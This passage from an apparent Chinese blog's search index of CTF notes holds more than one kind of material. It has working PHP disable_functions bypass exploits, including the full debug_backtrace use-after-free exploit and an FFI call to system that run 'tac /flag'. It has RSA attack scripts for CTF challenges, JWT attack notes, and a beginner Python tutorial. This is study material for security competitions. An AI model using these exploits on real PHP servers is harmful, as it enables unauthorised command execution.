$fake_bkt_off = 0x70 * 5 - 16;\n\n        $function_data = $this->str2ptr($this->abc, 0x50);\n        for($i = 0; $i < 4; $i++) {\n            $this->write($this->abc, $fake_bkt_off + $i * 8, \n                $this->leak2($function_data + 0x40 * 4, $i * 8));\n        }\n\n        # create a fake bucket\n        $fake_bkt_addr = $abc_addr + $fake_bkt_off;\n        $this->write($this->abc, 0x50, $fake_bkt_addr);\n        for($i = 0; $i < 3; $i++) {\n            $this->write($this->abc, 0x58 + $i * 4, 1, 4);\n        }\n\n        # copy bucket zval\n        $function_zval = $this->str2ptr($this->abc, $fake_bkt_off);\n        for($i = 0; $i < 12; $i++) {\n            $this->write($this->abc,  $fake_bkt_off + 0x70 + $i * 8, \n                $this->leak2($function_zval, $i * 8));\n        }\n\n        # pwn\n        $this->write($this->abc, $fake_bkt_off + 0x70 + 0x30, $zif_system);\n        $this->write($this->abc, $fake_bkt_off, $fake_bkt_addr + 0x70);\n\n        $spl1->offsetGet($cmd);\n\n        exit();\n    }\n}\n\n$y = [new Z()];\njson_encode([&$y]);\n```\n\n## 17.7 Backtrace UAF\n\n方法一：蚁剑插件PHP7_Backtrace_UAF\n\n方法二：脚本\n\n```php\n<?php\n\n# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)\n#\n# Bug: https://bugs.php.net/bug.php?id=76047\n# debug_backtrace() returns a reference to a variable \n# that has been destroyed, causing a UAF vulnerability.\n#\n# This exploit should work on all PHP 7.0-7.4 versions\n# released as of 30/01/2020.\n#\n# Author: https://github.com/mm0r1\n\npwn(\"tac /flag\");\n\nfunction pwn($cmd) {\n    global $abc, $helper, $backtrace;\n\n    class Vuln {\n        public $a;\n        public function __destruct() { \n            global $backtrace; \n            unset($this->a);\n            $backtrace = (new Exception)->getTrace(); # ;)\n            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4\n                $backtrace = debug_backtrace();\n            }\n        }\n    }\n\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n\n    function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= chr($ptr & 0xff);\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    function write(&$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i < $n; $i++) {\n            $str[$p + $i] = chr($v & 0xff);\n            $v >>= 8;\n        }\n    }\n\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper->a);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n        return $leak;\n    }\n\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write\n                # handle pie\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec\n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'constant' constant check\n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'bin2hex' constant check\n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) { # ELF header\n                return $addr;\n            }\n        }\n    }\n\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) { # system\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    function trigger_uaf($arg) {\n        # str_shuffle prevents opcache string interning\n        $arg = str_shuffle(str_repeat('A', 79));\n        $vuln = new Vuln();\n        $vuln->a = $arg;\n    }\n\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n\n    $n_alloc = 10; # increase this value if UAF fails\n    $contiguous = [];\n    for($i = 0; $i < $n_alloc; $i++)\n        $contiguous[] = str_shuffle(str_repeat('A', 79));\n\n    trigger_uaf('x');\n    $abc = $backtrace[1]['args'][0];\n\n    $helper = new Helper;\n    $helper->b = function ($x) { };\n\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n\n    # leaks\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n\n    # fake value\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n\n    # fake reference\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n\n    $closure_obj = str2ptr($abc, 0x20);\n\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n\n    # fake closure object\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i < 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n\n    # pwn\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); # internal func type\n    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler\n\n    ($helper->b)($cmd);\n    exit();\n}\n```\n\n## 17.8  FFI 扩展\n\n> PHP >= 7.4\n> 开启了 FFI 扩展且 ffi.enable=true \n\n方法一：蚁剑插件PHP74_FFI\n\n方法二：脚本\n\n```php\n<?php\n$ffi = FFI::cdef(\"int system(const char *command);\");\n$ffi->system(\"tac /flag > /tmp/hack\");\necho file_get_contents(\"/tmp/hack\");\n@unlink(\"/tmp/hack\");\n```\n\n## 17.9 iconv\n\n蚁剑方法同11.4\n\n# 18. JSON Web Token\n\n认识JWT：https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJbkob\n\n以下writeup看：https://blog.csdn.net/qq_46150940/article/details/113440680\n\n## 18.1 无签名\n\n一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。 \n\n## 18.2 弱密钥\n\n如果JWT采用对称加密算法，并且密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥。 \n\n## 18.3 修改签名算法\n\n有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的。 \n\n# 19. PHP\n\n```\n处理错误看日志，学习用法读文档\n```\n\nWAMP-Windows Apache MySQL PHP\n\nLAMP-Linux Apache MySQL PHP\n\necho/print\n\n```\necho-可以输出一个或多个字符串，没有返回值\nprint-只允许输出一个字符串(但可以用.连接字符串)，返回值总为1\necho输出速度比print快\necho 'hh','aa';\nprint 'hh'.'aa';\n```\n\n松散比较==，只比较值，不比较类型\n\n严格比较===，比较值和类型\n\n## 19.1 序列化与反序列化\n\n序列化/反序列化 给我们传递对象提供了一种简单的办法\n\n```\nserialize()将一个对象转化成一个字符串\nunserialize()将字符串还原为一个对象\n```\n\n反序列化与POP链(Property-Oriented Programing)\n\n与二进制的ROP(Return-Oriented Programing)原理相似，从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。\n\n__toString()触发条件：\n\n1. echo(\\$obj)/print($obj)\n2. 字符串连接时\n3. 格式化字符串时\n4. 与字符串进行\\==比较时(PHP进行==比较时会转换参数类型)\n5. 格式化SQL语句，绑定参数时\n6. 数组中有字符串时\n\n# 20. 模板注入\n\nSSTI(Server-side temple injection)服务端模板注入","categories":["漏洞渗透"],"tags":["Web","PHP"]},{"title":"RSA算法","url":"/posts/855b12c4.html","content":"\n我是悟出一个道理了，搞安全的逃不过各种密码算法，密码学一定要给我捡起来！！本来想在这里上传我的密码学笔记的，但是图片太多不想搞，放在CSDN博客也有一些兼容性问题。\n\n<!--more-->\n\n# 1. 算法描述\n\n（此处暴力摘抄百度百科）\n\nRSA算法的具体描述如下： \n（1）任意选取两个不同的大素数p和q计算乘积\n$$\nn=pq,\\ \\phi(n)=(p-1)(q-1)\n$$\n（2）任意选取一个大整数e，满足$\\gcd(e,\\phi(n))=1$ ，整数e用做加密钥（注意：e的选取是很容易的，例如，所有大于p和q的素数都可用，通常取65537）；\n\n（3）确定的解密钥d，满足$ed\\mod \\phi(n)=1$，即$ed=k\\phi(n)+1,k\\ge1$是一个任意的整数；所以，若知道e和$\\phi(n)$，则很容易计算出d；\n\n（4）公开整数n和e，秘密保存d；\n\n（5）将明文m（m<n是一个整数）加密成密文c，加密算法为\n$$\nc = Enc(m)=m^e\\mod n\n$$\n（6）将密文c解密为明文m，解密算法为\n$$\nm = Dec(c) = c^d\\mod n\n$$\n然而只根据n和e（注意：不是p和q）要计算出d是不可能的。因此，任何人都可对明文进行加密，但只有授权用户（知道d）才可对密文解密。总之，RSA总离不开n、e、d、p、q五个数。(n,e)组成公钥，d为私钥。\n\n五个数之间的关系：\n\np和q：大整数n的两个因子（factor）\nn：大整数n，我们称之为模数（modulus）\ne和d：互为模反数的两个指数（exponent）\n\n# 2. 算法攻击\n\n## 2.1 模数分解\n\n解决RSA题目最简单，最暴力，最好使的方法就是分解模数n。如果能够将n分解，成功得到p，q的取值，那么可求$\\phi(n)$。\n\n那么如何分解模数呢？这里有几种方法。\n\n### 2.1.1 直接分解\n\n利用 http://factordb.com/ 直接分解模数n，但这种方法只适用于n比较小的情况(512bit-768bit以内，即长度为64-96之间)，其实也有特殊情况，我就成功分解过一个长度为511的大整数。\n\n### 2.1.2 利用公约数\n\n如果在两次公钥的加密过程中使用的$n_1$ 和$n_2$具有相同的e，那么可以利用欧几里得算法直接将$n_1$和$n_2$分解。\n\n通过欧几里得算法可以直接求出$n_1$和$n_2$的最大公约数p：$(n_1,n_2)=p$\n\n可以得出：$n_1=pq_1$，$n_2=pq_2$\n\n```python\ndef gcd(a, b):\n   if a < b:\n     a, b = b, a\n   while b != 0:\n     temp = a % b\n     a = b\n     b = temp\n   return a\n\nif __name__ == '__main__':\n    n1 = input(\"n1:\")\n    n2 = input(\"n2:\")\n    p = gcd(n1, n2)\n    print (p)\n    q1 = n1 // p\n    print (q1)\n```\n\n### 2.1.3 yafu分解\n\n在p，q的取值差异过大，或者p，q的取值过于相近的时候，Format方法与Pollard rho方法都可以很快将n分解成功。\n\n此类分解方法有一个开源项目yafu将其自动化实现了，不论n的大小，只要p和q存在相差过大或者过近时，都可以通过yafu很快地分解成功。(我怎么知道p、q相差大不大，相不相近，反正如果上面两种方法都不行，就可以试试这种方法)\n\n```\n用法：factor(n)\n```\n\n```\nD:\\CTF\\tools\\yafu-1.34>yafu-x64.exe\nfactor(23333333333333)\n\n\nfac: factoring 23333333333333\nfac: using pretesting plan: normal\nfac: no tune info: using qs/gnfs crossover of 95 digits\ndiv: primes less than 10000\nfmt: 1000000 iterations\nTotal factoring time = 0.0050 seconds\n\n\n***factors found***\n\nP2 = 31\nP12 = 752688172043\n\nans = 1\n```\n\n### 2.1.4 成功分解模数后\n\n成功求出p、q的值后就可以用脚本进行解密求得私钥d了。\n\n```python\nimport gmpy2\nn = 103461035900816914121390101299049044413950405173712170434161686539878160984549\np = 282164587459512124844245113950593348271\nq = 366669102002966856876605669837014229419\ne = 65537\n\nd = gmpy2.invert(e,(p-1)*(q-1))\nprint (\"d = \" + str(d))\n#d为私钥\nc = 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35\nm = gmpy2.powmod(c,d,n)\nprint(\"m = \" + str(m))\n'''\nd = 91646299298871237857836940212608056141193465208586711901499120163393577626813\nm = 185534734614696481020381637136165435809958101675798337848243069\n'''\n```\n\n## 2.2 低加密指数分解\n\n当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。\n\n在$m^e=k*n+c$中m是要求的，e，n，c已知，需要爆破n。在开e次方得到整数的时候这时候的k和m是需要的值。\n\n```python\n#!/usr/bin/python\n# coding=utf-8\nimport gmpy\nfrom Crypto.PublicKey import RSA\n\n\ndef calc(j):\n\n    a, b = gmpy.root(cipher + j * N, 3)\n    if b > 0:\n        m = a\n        print '{:x}'.format(int(m)).decode('hex')\n        # pool.terminate()\n\n# 读入公钥\nwith open('pubkey.pem', 'r') as f:\n    key = RSA.importKey(f)\n    N = key.n\n    e = key.e\n\n# 读入密文\nwith open('flag.enc', 'r') as f:\n    cipher = f.read().encode('hex')\n    cipher = int(cipher, 16)\n\n# 暴力破解\ninputs = range(0, 118720000)\nresult = []\nmap(calc, inputs)\nprint len(result)\n```\n\n除了低加密指数攻击，还有低解密指数攻击，也就是密钥d比较小的情况，密钥d小意味着e很大，所以e很大的可以用低解密指数攻击。\n\n低解密指数攻击工具：https://github.com/pablocelayes/rsa-wiener-attack\n\n将整个文件打包解压放在主机，这里要将破解脚本放在rsa-wiener-attack目录下，否则导入包时会发生错误。\n\n```python\n#python2\nimport hashlib\nimport RSAwienerHacker\nN = 101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471\ne = 46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085\nd =  RSAwienerHacker.hack_RSA(e,N)\nprint(d)\nflag = \"flag{\" + hashlib.md5(hex(d)).hexdigest() + \"}\"\nprint(flag)\n#8920758995414587152829426558580025657357328745839747693739591820283538307445\n#flag{47bf28da384590448e0b0d23909a25a4}\n```\n\npython3环境下会报编码错误，是因为python3里hex(d)的结果和python2里hex(d)的结果相差了一个末尾的L，所以再计算md5的结果也就不一样，可以手动加上L再放到md5函数里面。\n\n```python\nprint(hashlib.md5(b'0x13b8f87d588e2aa4a27296cf2898f56ab4c8deb5a1222ec080e23afecaf7f975L').hexdigest())\n```\n\n## 2.3 共模攻击\n\n如果在RSA加密中使用了不同的e而使用了相同的n对相同的明文m进行加密，那么就可以在不分解n的情况下还原出明文m的值，其中$e_1$和$e_2$互素。\n$$\nc_1=m^{e_1}\\mod n\n$$\n$$\nc_2=m^{e_2}\\mod n\n$$\n\n证明：\n\n因为$\\gcd(e_1,e_2)=1$，即存在$s_1,s_2$使得：\n$$\ns_1*e_1+s_2*e_2=1\n$$\n又因为：\n$$\nc_1= m^{e_1}\\mod n\n$$\n$$\n c_2= m^{e_2} \\mod n\n$$\n\n通过代入化简可以得出：\n$$\nc_1^{s_1}*c_2^{s_2}= m \\mod n\n$$\n\n```python\n#coding=utf-8\n#python2\nimport gmpy2\nfrom libnum import n2s,s2n\nn = 0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929L\ne1 = 17\ne2 = 65537\nfo1 = open(\"flag.enc1\",'rb')\nfo2 = open(\"flag.enc2\",\"rb\")\n\ndatafo1 = fo1.read()\nmessage1 = s2n(datafo1)\nfo1.close()\ndatafo2 = fo2.read()\nmessage2 = s2n(datafo2)\n\ngcd,s,t = gmpy2.gcdext(e1,e2)\nprint (message1)\nprint (gcd,s,t)\n\n\n#s和t一定有一个位负数，若s<0,求a^s <=> (1/a)^(-s)\n\nplain = gmpy2.powmod(message1, s, n) * gmpy2.powmod(message2, t, n) % n\n\nprint (plain)\n\nprint (n2s(plain))\n\n#gcdext(...) gcdext(a, b) returns a 3-element tuple (g, s, t) such that\n#g == gcd(a, b) and g == a * s + b * t\n\n\n#invert(...) invert(x, m) returns y such that x * y == 1 modulo m, or 0 if no such y exists.\n```\n\n\n\n\n\n","categories":["算法"],"tags":["Python"]},{"title":"Python学习","url":"/posts/e39e2a4e.html","content":"\nPython作为我学习的第三门语言，感觉它与Java还是有些相似之处，所以3天内学完Python对我来说还可以接受，关键是读写文件那里还是有些许不懂的地方。之所以学习Python，是因为我们专业开了一门机器学习的课，老师要求用Python编写程序，另一门课也涉及到爬虫之类。\n\n<!--more-->\n\n# 1. print函数\n\n```python\n#输出数字\nprint(520)\nprint(22.22)\n\n#输出字符串\nprint('hello world')\nprint(\"v5le0n9\")\n\n#输出含有运算符的表达式\nprint(520+22.22)\n\n#将数据输出到文件中\nfp = open('D:/text.txt', 'a+')\nprint('hello world', file=fp)\nfp.close()\n\n#不进行换行输出\nprint('hello', 'world', 'Python')\n```\n\n# 2. 转义字符\n\n```python\nprint('hello\\nv5le0n9')\t\t#换行\nprint('hello\\tv5le0n9')\t\t#Tab键，4个一组\nprint('helloooo\\tv5le0n9')\nprint('hello\\rv5le0n9')\t\t#光标回到初始位置\nprint('hello\\bv5le0n9')\t\t#退格，回退一个字符\nprint('hello\\\\tv5le0n9')\t#输出反斜杠\nprint('hello\\'v5le0n9')\t\t#输出单引号\nprint(r'hello\\nv5le0n9')\t#原样输出\n\n'''\nhello\nv5le0n9\nhello   v5le0n9\nhelloooo        v5le0n9\nv5le0n9\nhellv5le0n9\nhello\\tv5le0n9\nhello'v5le0n9\nhello\\nv5le0n9\n'''\n```\n\n# 3. 字符编码与关键字\n\n```python\nprint(chr(0b100111001011000))#输出字符“乘”,chr编码转字符\nprint(ord('乘'))#输出十进制20056,ord字符转编码\n```\n\n关键字不能作为标识符使用：\n\n```python\nimport keyword\nprint(keyword.kwlist)\n'''\n['False', 'None', 'True', 'and', 'as', 'assert', 'async', 'await', 'break', 'class', 'continue', 'def', 'del', 'elif', 'else', 'except', 'finally', 'for', 'from', 'global', 'if', 'import', 'in', 'is', 'lambda', 'nonlocal', 'not', 'or', 'pass', 'raise', 'return', 'try', 'while', 'with', 'yield']\n'''\n```\n\n# 4. 变量\n\n```python\nname = 'v5le0n9'\nprint(name)\nprint('标识', id(name))\nprint('类型', type(name))\nprint('值', name)\n'''\nv5le0n9\n标识 1893355704496\n类型 <class 'str'>\n值 v5le0n9\n'''\n```\n\n当变量被多次赋值后，变量名会指向新的空间，旧的那个如果没有其他变量指向它，则成为内存垃圾。\n\n# 5. 数据类型\n\n| 数据类型   | python中表示 | 例子        |\n| ---------- | ------------ | ----------- |\n| 整数类型   | int          | 98          |\n| 浮点数类型 | float        | 2.66        |\n| 布尔类型   | bool         | True, False |\n| 字符串类型 | str          | 'v5le0n9'   |\n\n## 5.1 整数类型\n\n```python\nn1 = 90\nn2 = -72\nn3 = 0\nprint(n1, type(n1))\nprint(n2, type(n2))\nprint(n3, type(n3))\nprint('十进制', 118)\nprint('二进制转十进制', 0b1011010)\nprint('八进制转十进制', 0o1234567)\nprint('十六进制转十进制', 0x1a4b5d)\n'''\n90 <class 'int'>\n-72 <class 'int'>\n0 <class 'int'>\n十进制 118\n二进制转十进制 90\n八进制转十进制 342391\n十六进制转十进制 1723229\n'''\n```\n\n## 5.2 浮点类型\n\n```python\na = 3.1415926\nprint(a, type(a))\nn1 = 1.1\nn2 = 2.2\nprint(n1 + n2)\n'''\n3.1415926 <class 'float'>\n3.3000000000000003\n'''\n```\n\n```python\nfrom decimal import Decimal\nprint(Decimal('1.1') + Decimal('2.2'))\n'''\n3.3\n'''\n```\n\n## 5.3 布尔类型\n\n```python\nprint(True + 1)\nprint(False + 1)\n'''\n2\n1\n'''\n```\n\n## 5.4 字符串类型\n\n```python\nstr1 = 'v5le0n9'\nstr2 = \"v5le0n9\"\nstr3 = '''\nv5le0n9\nl30n9ry0n\n'''\nstr4 = \"\"\"\nhhhhhhh\nkkkkkkk\n\"\"\"\n```\n\n## 5.5 数据类型转换\n\n其他类型转字符串\n\n```python\nname = \"张三\"\nage = 23\nprint(type(name), type(age))\nprint('我叫' + name + '，今年' + str(age) + '岁')\nage = 22.3\nprint(str(age))\n'''\n<class 'str'> <class 'int'>\n我叫张三，今年23岁\n22.3\n'''\n```\n\n其他类型转整型\n\n```python\ns1 = '128'\nf1 = 98.7\ns2 = '76.77'\nff = True\ns3 = 'Hello'\nprint(int(s1), type(int(s1)))\nprint(int(f1), type(int(f1)))\n#print(int(s2), type(s2)) #小数串不能转化为整型\nprint(int(ff), type(int(ff)))\n#print(int(s3), type(s3))  #不是整型数字串\n'''\n128 <class 'int'>\n98 <class 'int'>\n1 <class 'int'>\n'''\n```\n\n其他类型转浮点型\n\n```python\ns1 = '128.77'\ns2 = '76'\nff = True\ns3 = 'Hello'\nii = 98\nprint(float(s1), type(float(s1)))\nprint(float(s2), type(float(s2))) \nprint(float(ff), type(float(ff)))\n#print(float(s3), type(float(s3))) #不是数字串\nprint(float(ii), type(float(ii)))\n'''\n128.77 <class 'float'>\n76.0 <class 'float'>\n1.0 <class 'float'>\n98.0 <class 'float'>\n'''\n```\n\n其他类型转布尔类型\n\n```python\ns1 = '128.77'\ns2 = '76'\nff = True\ns3 = 'Hello'\nii = 98\ni2 = 0\nprint(bool(s1), type(bool(s1)))\nprint(bool(s2), type(bool(s2))) \nprint(bool(ff), type(bool(ff)))\nprint(bool(s3), type(bool(s3)))\nprint(bool(ii), type(bool(ii)))\nprint(bool(i2), type(bool(i2)))\n'''\nTrue <class 'bool'>\nTrue <class 'bool'>\nTrue <class 'bool'>\nTrue <class 'bool'>\nTrue <class 'bool'>\nFalse <class 'bool'>\n'''\n```\n\n# 6. input函数\n\n用于用户输入。\n\n```python\npresent = input('你猜我在干嘛\\n')\nprint(present, type(present))\n'''\n你猜我在干嘛\n你猜我猜不猜\n你猜我猜不猜 <class 'str'>\n'''\n```\n\n```python\n#从终端输入两个整数，计算两个数的和\nnum1 = input(\"输入第一个：\")\nnum2 = input(\"输入第二个：\")\nprint(type(num1), type(num2))\nprint(num1 + num2)\n'''\n输入第一个：10\n输入第二个：30\n<class 'str'> <class 'str'>\n1030\n'''\n\nnum1 = int(input(\"输入第一个：\"))\nnum2 = int(input(\"输入第二个：\"))\nprint(type(num1), type(num2))\nprint(num1 + num2)\n'''\n输入第一个：10\n输入第二个：30\n<class 'int'> <class 'int'>\n40\n'''\n```\n\n# 7. 运算符\n\n## 7.1 算术运算符\n\n```python\nprint(1 + 1)\nprint(1 - 1)\nprint(1 * 1)\nprint(1 / 2)\t#除法\nprint(11 // 2)\t#整除\nprint(2**4)\t\t#幂运算\n'''\n2\n0\n1\n0.5\n5\n16\n'''\n```\n\n| 运算符 | 表示                           | 例子                  | 结果 |\n| ------ | ------------------------------ | --------------------- | ---- |\n| %      | 取余(一正一负要公式，向下取整) | 9%4                   | 1    |\n|        | 余数=被除数-除数*商            | 9%-4<br />9-(-4)*(-3) | -3   |\n| //     | 整除(一正一负向下取整)         | 11//2                 | 5    |\n|        |                                | 9//-4                 | -3   |\n|        |                                | -9//4                 | -3   |\n\n## 7.2 赋值运算符\n\n```python\na = 3\na = b = c = 20\na, b, c = 10, 20, 30\na += 10\nc //= a\n\na, b = 10, 20\na, b = b, a\nprint(a, b)\t#20 10\n```\n\n## 7.3 比较运算符\n\n```python\na, b = 10, 20\nprint(a > b)\nprint(a == b)\nprint(a != b)\n'''\nFalse\nFalse\nTrue\n'''\n```\n\n```python\na = 10\nb = 10\nprint(a == b)\n#比较对象的标识用is/isnot\nprint(a is b)\nprint(a is not b)\n'''\nTrue\nTrue\nFalse\n'''\n```\n\n```python\nlist1 = [11,22,33,44]\nlist2 = [11,22,33,44]\nprint(list1 == list2)\nprint(list1 is list2)\nprint(id(list1))\nprint(id(list2))\n'''\nTrue\nFalse\n2189001749064\n2189001776136\n'''\n```\n\n## 7.4 布尔运算符\n\n| 运算符 | 运算数 |       | 运算结果 | 备注                                     |\n| ------ | ------ | ----- | -------- | ---------------------------------------- |\n| and    | True   | True  | True     | 当两个运算都为True时，运算结果才为True   |\n|        | True   | False | False    |                                          |\n|        | False  | True  | False    |                                          |\n|        | False  | False | False    |                                          |\n| or     | True   | True  | True     | 只要有一个运算数为True，运算结果就为True |\n|        | True   | False | True     |                                          |\n|        | False  | True  | True     |                                          |\n|        | False  | False | False    |                                          |\n| not    | True   |       | False    | 如果运算数为True，运算结果为False        |\n|        | False  |       | True     | 如果运算数为False，运算结果为True        |\n\n```python\nw = 'Hello world'\nprint('v' in w)\nprint('h' in w)\nprint('w' in w)\nprint('a' not in w)\n'''\nFalse\nFalse\nTrue\nTrue\n'''\n```\n\n## 7.5 位运算\n\n| 运算符 | 备注                                  |\n| ------ | ------------------------------------- |\n| &      | 对应数位都为1，结果数位才是1，否则为0 |\n| \\|     | 对应数位都为0，结果数位才是0，否则为1 |\n| <<     | 高位溢出舍弃，低位补0                 |\n| \\>>    | 低位溢出舍弃，高位补0                 |\n\n## 7.6 运算符的优先级\n\n算术运算 > 位运算 > 比较运算 > 布尔运算 > 赋值运算\n\n# 8. 程序的组织结构\n\n流程控制：顺序结构、选择结构、循环结构\n\n## 8.1 选择结构\n\n### 8.1.1 单分支结构\n\n```python\nif 条件表达式:\n    条件执行体\n```\n\n```python\nmoney = 10000\nx = int(input(\"请输入取款金额：\"))\nif money >= x:\n    money -= x\n    print(\"取款成功，余额为：\", money)    \n```\n\n### 8.1.2 双分支结构\n\n```python\nif 条件表达式:\n    条件执行体1\nelse:\n    条件执行体2\n```\n\n```python\nmoney = 10000\nx = int(input(\"请输入取款金额：\"))\nif money >= x:\n    money -= x\n    print(\"取款成功，余额为：\", money)    \nelse:\n    print(\"取款失败，余额不足\")\n```\n\n### 8.1.3 多分支结构\n\n```python\nif 条件表达式:\n    条件执行体1\nelif 条件表达式2:\n    条件执行体2\nelif 条件表达式N:\n    条件执行体N\nelse:\n    条件执行体N+1\n```\n\n```python\ngrade = 50\nif grade >= 90 and grade <= 100:\n    print('A')\nelif grade >=80 and grade < 90:\n    print('B')\nelif grade >= 70 and grade < 80:\n    print('C')\nelif grade >=60 and grade < 70:\n    print('D')\nelif grade < 60 and grade >= 0:\n    print('E')\nelse:\n    print(\"非法数据！\")\n    \n#离谱写法\ngrade = 90\nif 90<=grade<=100:\n    print('A')\nelif 80<=grade<90:\n    print('B')\n...\n```\n\n### 8.1.4 嵌套if语句\n\n```python\nif 条件表达式:\n    if 内层条件表达式:\n        内存条件执行体1\n    else:\n        内层条件执行体2\nelse:\n    条件执行体\n```\n\n### 8.1.5 条件表达式\n\n条件表达式是if...else的简写。\n\n```\nx if 判断条件 else y\n```\n\n运算规则：如果判断条件的布尔值为True，条件表达式的返回值为x，否则条件表达式的返回值为False。\n\n```python\nnum_a = int(input(\"请输入第一个整数：\"))\nnum_b = int(input(\"请输入第二个整数：\"))\nprint(num_a) if num_a >= num_b else print(num_b)\nprint(str(num_a) + '大于等于' + str(num_b) if num_a >= num_b else str(num_a) + '小于' + str(num_b))\n```\n\n## 8.2 pass语句\n\npass语句什么都不做，只是一个占位符，用在语法上需要语句的地方。\n\n什么时候使用：先搭建语法结构，还没想好代码怎么写\n\n哪些语句一起使用：\n\n- if语句的条件执行体\n- for-in语句的循环体\n- 